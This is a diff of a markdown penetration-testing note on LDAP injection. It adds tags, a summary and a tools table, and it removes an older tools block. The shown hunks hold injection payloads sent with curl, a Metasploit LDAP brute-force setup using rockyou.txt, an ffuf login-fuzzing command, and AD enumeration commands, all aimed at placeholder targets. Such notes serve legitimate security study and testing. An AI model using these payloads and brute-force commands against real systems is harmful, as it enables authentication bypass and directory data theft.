@@ -1,12 +1,30 @@
 # LDAP Injection
 
-LDAP queries built from unsanitized user input allow filter manipulation — authentication bypass, data enumeration, or blind extraction.
+#LDAPi #Injection #WebAppAttacks #ActiveDirectory
+
+
+## What is this?
+
+LDAP query injection via unsanitized input — enables auth bypass, attribute enumeration, and blind data extraction. Common in directory-integrated apps. Pairs with [[SQL Injection]], [[Web Attacks]].
+
+
+---
+
+## Tools
+
+| Tool | Purpose |
+|---|---|
+| `Burp Suite` | Intercept login requests, inject LDAP payloads, Intruder with SecLists LDAP wordlist |
+| `ldapsearch` | Manual enumeration and auth bypass testing — `ldapsearch -x -H ldap://<target> -b "dc=target,dc=com" "(objectClass=*)"` |
+| `ldapdomaindump` | Enumerate AD over LDAP and output HTML/JSON — `ldapdomaindump -u 'domain\user' -p 'pass' <dc-ip>` |
+| `Metasploit` | `auxiliary/scanner/ldap/ldap_login` for credential brute-force |
+| SecLists | LDAP injection strings — `/usr/share/seclists/Fuzzing/LDAP.Injection.Fuzz.Strings.txt` |
 
 ---
 
 ## LDAP Filter Basics
 
-```
+```bash
 # Standard auth query:
 (&(uid=<username>)(password=<password>))
 
@@ -200,30 +218,6 @@ curl -s --data-urlencode "search=)(|(uid=*" "http://<target>/search"
 curl -s --data-urlencode "search=*)(|(memberOf=CN=Admins,DC=corp,DC=local" "http://<target>/search"
 ```
 
----
-
-## Tools
-
-```bash
-# ldap-brute (Metasploit)
-use auxiliary/scanner/ldap/ldap_login
-set RHOSTS <target>
-set USERNAME admin
-set PASS_FILE /usr/share/wordlists/rockyou.txt
-
-# ldapsearch — enumerate after auth bypass
-ldapsearch -x -H ldap://<target> -D "cn=admin,dc=target,dc=com" -w "password" -b "dc=target,dc=com" "(objectClass=*)"
-
-# LDAPDomainDump — enumerate AD via LDAP
-ldapdomaindump -u 'domain\user' -p 'pass' <dc-ip>
-
-# Manual auth bypass test with ldapsearch filter
-ldapsearch -x -H ldap://<target> -b "dc=target,dc=com" "(&(uid=admin)(userPassword=*))"
-
-# BurpSuite — intruder on login with LDAP payloads from SecLists:
-# /usr/share/seclists/Fuzzing/LDAP.Injection.Fuzz.Strings.txt
-ffuf -w /usr/share/seclists/Fuzzing/LDAP-Injection-Fuzzing-Strings.txt -u "http://<target>/login" -X POST -d "username=FUZZ&password=test" -H "Content-Type: application/x-www-form-urlencoded" -mr "Welcome|Dashboard|Success" -v
-```
 
 ---
 
@@ -267,3 +261,9 @@ a*)(&               # users starting with 'a'
 # LDAP injection fuzz list
 /usr/share/seclists/Fuzzing/LDAP-Injection-Fuzzing-Strings.txt
 ```
+
+---
+
+*Created: 2026-03-04*
+*Updated: 2026-05-13*
+*Model: claude-sonnet-4-6*
